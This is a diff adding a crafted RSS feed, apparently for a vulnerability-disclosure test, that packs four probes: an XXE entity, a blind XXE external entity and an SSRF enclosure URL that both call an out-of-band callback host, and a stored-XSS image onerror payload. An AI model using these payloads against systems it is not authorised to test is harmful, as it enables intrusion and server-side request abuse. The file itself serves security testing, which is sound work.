@@ -1,0 +1,35 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!-- TEST 1: XXE (Entity Expansion) - Visual Confirm -->
+  <!-- If the title in the UI changes to include "VULN_SUCCESS", XXE is enabled. -->
+  <!ENTITY visualCheck "VULN_SUCCESS" >
+
+  <!-- TEST 2: XXE (Blind / Out-of-Band) - Network Confirm -->
+  <!-- If your Collaborator gets a ping from /xxe_trigger, the parser fetched this URL. -->
+  <!ENTITY blindCheck SYSTEM "http://phsrenjcxgefqbuibhlmmzh9nflr3gcop.oast.fun/xxe_trigger" >
+]>
+<rss version="2.0">
+  <channel>
+    <!-- The &visualCheck; entity is used here. -->
+    <title>VDP Test: &visualCheck;</title>
+    <link>http://example.com</link>
+    <description>Combined Security Test</description>
+
+    <item>
+      <!-- The &blindCheck; entity is used here. -->
+      <title>Item Check &blindCheck;</title>
+      <link>http://example.com/test</link>
+      
+      <!-- TEST 3: Stored XSS -->
+      <!-- We use CDATA to prevent XML errors, but inject HTML that executes JS if rendered unsanitized. -->
+      <description><![CDATA[ 
+        <h3>Security Check</h3>
+        <img src=x onerror=alert('XSS_POP_domain='+document.domain)> 
+      ]]></description>
+      
+      <!-- TEST 4: Application Logic SSRF (Non-XXE) -->
+      <!-- Many RSS parsers automatically fetch 'enclosure' URLs to check file size or MIME type. -->
+      <enclosure url="http://phsrenjcxgefqbuibhlmmzh9nflr3gcop.oast.fun/ssrf_enclosure_check" length="123" type="audio/mpeg" />
+    </item>
+  </channel>
+</rss>
